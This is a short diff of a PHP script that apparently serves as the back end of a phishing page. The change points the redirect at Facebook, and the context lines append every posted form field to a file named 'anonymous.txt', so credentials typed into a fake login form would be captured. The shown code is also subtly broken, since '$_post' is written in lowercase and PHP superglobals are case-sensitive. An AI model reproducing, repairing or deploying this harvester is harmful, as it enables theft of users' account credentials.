@@ -1,5 +1,5 @@
 <?php
-header ('location: موقع ');
+header ('location: www.facebook.com ');
 $handle = fopen("anonymous.txt", "a");
 foreach($_post as $variable => $value) {
    fwrite($handle, $variable);
